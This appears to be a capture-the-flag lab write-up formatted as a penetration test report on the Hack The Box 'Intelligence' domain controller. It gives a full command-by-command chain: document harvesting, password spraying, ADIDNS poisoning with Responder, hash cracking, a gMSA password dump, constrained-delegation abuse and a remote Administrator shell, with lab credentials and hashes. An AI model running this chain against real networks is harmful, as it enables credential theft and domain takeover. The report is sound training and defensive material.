# Penetration Test Report — Intelligence

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-ADIDNS%20%2F%20gMSA%20%2F%20constrained%20delegation-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `intelligence.htb`) harvested internal PDF documents from the web server by brute-forcing a predictable naming scheme. Document metadata yielded a user list, and document contents revealed a **default password**; password spraying produced a valid account (`Tiffany.Molina`). A scheduled PowerShell script that authenticated to `web*` DNS records was hijacked by adding a rogue **ADIDNS** record, capturing the hash of `Ted.Graves`. That account could read a **gMSA** password, and the gMSA held **constrained delegation** rights to the DC — resulting in a shell as Administrator and full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Internal documents exposed via predictable filenames | Medium |
| 2 | Default password reused across accounts (password spray) | High |
| 3 | ADIDNS: authenticated users can create DNS records → hash capture | High |
| 4 | ReadGMSAPassword on `svc_int` + constrained delegation to DC | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports target.htb
```

DC for `intelligence.htb`; IIS on 80. The site linked PDFs under `documents/` with a predictable scheme (`YYYY-MM-DD-upload.pdf`).

### 2. Foothold — Document Harvesting & Password Spray

Mass-download with a date loop (20 parallel wgets):

```bash
d=2020-01-01; while [ "$d" != `date -I` ]; do
  echo "http://target.htb/Documents/$d-upload.pdf"; d=$(date -I -d "$d + 1 day")
done | xargs -n 1 -P 20 wget 2>/dev/null
```

Metadata produced a username list; content produced a **default password**:

```bash
exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
for f in *pdf; do pdftotext $f; done
head -n1 *txt
cat 2020-{06-04,12-30}-upload.txt   # default password: NewIntelligenceCorpUser9876
```

Password spray:

```bash
kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc target.htb -d intelligence.htb
# Tiffany.Molina

smbclient.py Tiffany.Molina:NewIntelligenceCorpUser9876@target.htb   # Users share → user flag
```

### 3. Lateral Movement — ADIDNS Poisoning

The `IT` share contained `downdetector.ps1`, a scheduled script that sends **authenticated** web requests to every DNS record starting with `web`. Authenticated users can create ADIDNS records — a rogue record pointed `web1` at the attacker host:

```bash
dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 \
  target.htb -a add -r web1 -d <attacker-ip> -t A
responder -I tun0
```

Within minutes, Responder captured the hash of `Ted.Graves`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Ted.Graves : Mr.Teddy
```

### 4. Privilege Escalation — gMSA → Constrained Delegation

BloodHound (`bloodhound-python -c All`) mapped the path: `Ted.Graves` ∈ **ITSUPPORT** → **ReadGMSAPassword** on `SVC_INT` → `SVC_INT` has **AllowedToDelegate** to the DC.

Dump the gMSA password hash:

```bash
git clone https://github.com/micahvandeusen/gMSADumper
python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l target.htb
# svc_int NT: b98d4cef68f72a98dfeed732d1b1abca
```

Abuse constrained delegation to impersonate Administrator (sync clock first):

```bash
echo "target.htb intelligence.htb" | sudo tee -a /etc/hosts
sudo ntpdate -s target.htb
getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator \
  intelligence.htb/svc_int -hashes :b98d4cef68f72a98dfeed732d1b1abca
```

Shell as Administrator:

```bash
export KRB5CCNAME=Administrator.ccache
echo "target.htb dc.intelligence.htb" | sudo tee -a /etc/hosts
wmiexec.py -k -no-pass dc.intelligence.htb
```

Root flag obtained.

## Remediation

- Deny directory browsing; avoid predictable document names; gate internal docs behind auth.
- Kill default passwords; force change at first logon; screen against known-breached lists.
- Restrict ADIDNS record creation (disallow `web*` collisions); alert on new A records; disable WebClient where feasible.
- Audit ReadGMSAPassword and delegation rights; alert on S4U requests for privileged accounts.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1078 / T1110.003 — Password Spraying |
| Credential Access | T1557.001 — Forced Auth via rogue DNS (ADIDNS) |
| Credential Access | T1558 — Steal/Forge Kerberos Tickets (S4U2proxy) |
| Privilege Escalation | T1134 — Access Token Manipulation / Delegation |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
